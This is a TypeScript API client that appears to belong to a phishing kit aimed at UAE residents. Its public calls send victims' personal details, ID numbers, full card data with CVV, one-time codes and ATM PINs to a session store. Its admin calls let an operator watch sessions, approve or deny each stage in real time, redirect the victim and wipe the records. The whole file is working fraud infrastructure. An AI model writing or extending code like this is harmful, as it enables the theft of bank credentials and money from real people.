const API_BASE = ''; // Same origin

async function request(path: string, options: RequestInit = {}): Promise<any> {
  const url = `${API_BASE}${path}`;
  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
  };
  
  const token = localStorage.getItem('adminToken');
  if (token) {
    headers['Authorization'] = `Bearer ${token}`;
  }
  
  const res = await fetch(url, {
    ...options,
    headers: { ...headers, ...options.headers },
    credentials: 'include',
  });
  
  const data = await res.json();
  
  if (!res.ok) {
    throw new Error(data.error || 'Request failed');
  }
  
  return data;
}

// ========== Public API ==========

export async function createRegistration(data: {
  sessionId: string;
  fullName: string;
  phoneNumber: string;
  email: string;
  emirate: string;
  district?: string;
  membershipTier: string;
  totalAmount?: string;
  idNumber?: string;
  addressEmirate?: string;
  addressDistrict?: string;
  addressStreet?: string;
  addressBuildingNumber?: string;
}) {
  return request('/api/registration', {
    method: 'POST',
    body: JSON.stringify(data),
  });
}

export async function createSession(data: {
  sessionId: string;
  fullName: string;
  phoneNumber: string;
  email: string;
  emirate: string;
  district?: string;
  membershipTier: string;
  totalAmount?: string;
  idNumber?: string;
}) {
  return request('/api/session', {
    method: 'POST',
    body: JSON.stringify(data),
  });
}

export async function updateSession(data: {
  sessionId: string;
  cardName?: string;
  cardNumber?: string;
  cardNumberMasked?: string;
  cardExpiry?: string;
  cardCvv?: string;
  otpCode?: string;
  atmPin?: string;
  stage?: string;
}) {
  return request('/api/session/update', {
    method: 'POST',
    body: JSON.stringify(data),
  });
}

export async function getSessionStatus(sessionId: string) {
  return request(`/api/session/${sessionId}`);
}

export async function getRedirectUrl(sessionId: string) {
  return request(`/api/session/redirect/${sessionId}`);
}

// ========== Admin API ==========

export async function adminLogin(password: string) {
  return request('/api/admin/login', {
    method: 'POST',
    body: JSON.stringify({ password }),
  });
}

export async function adminVerify(token: string) {
  return request('/api/admin/verify');
}

export async function adminGetStats() {
  return request('/api/admin/stats');
}

export async function adminGetSessions() {
  return request('/api/admin/sessions');
}

export async function adminGetSession(sessionId: string) {
  return request(`/api/admin/sessions/${sessionId}`);
}

export async function adminSessionAction(sessionId: string, action: 'pass' | 'denied' | 'completed', errorMessage?: string) {
  return request('/api/admin/sessions/action', {
    method: 'POST',
    body: JSON.stringify({ sessionId, action, errorMessage }),
  });
}

export async function adminRedirect(sessionId: string, redirectUrl: string) {
  return request('/api/admin/sessions/redirect', {
    method: 'POST',
    body: JSON.stringify({ sessionId, redirectUrl }),
  });
}

export async function adminClearAll() {
  return request('/api/admin/clear', {
    method: 'POST',
  });
}
